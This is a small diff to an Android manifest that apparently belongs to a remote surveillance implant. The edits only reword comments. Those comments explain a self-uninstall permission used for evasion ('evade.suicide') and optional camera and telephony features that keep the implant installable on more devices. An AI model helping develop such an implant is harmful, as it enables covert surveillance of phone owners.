@@ -40,17 +40,17 @@
          application a user installs; REQUEST_DELETE_PACKAGES is a normal
          permission, granted at install without a prompt, and it is what the
          platform checks in the branch it takes when the caller is neither
-         the device owner nor the installer of record -- the branch that
-         shows the user the confirmation.  The implant removes itself only
-         (evade.suicide), so this is the narrow half of that contract. -->
+         the device owner nor the installer of record, which is the branch
+         that shows the user the confirmation.  The implant removes itself
+         only (evade.suicide), so this is the narrow half of that contract. -->
     <uses-permission android:name="android.permission.REQUEST_DELETE_PACKAGES" />
 
     <!-- The hardware the senses want is not the hardware the implant
          needs.  A phone without a radio, or a tablet without a camera, runs
          the beacon and answers "the phone has no camera" when the operator
-         asks for one; that answer is already in the code, and required
-         = "false" is the manifest saying the same thing.  Without these
-         two lines the store would filter the application out of every
+         asks for one; that answer is already in the code, and
+         required="false" is the manifest saying the same thing.  Without
+         these lines the store would filter the application out of every
          device that lacks either, which is not what the code supports. -->
     <uses-feature android:name="android.hardware.telephony" android:required="false" />
     <uses-feature android:name="android.hardware.camera" android:required="false" />
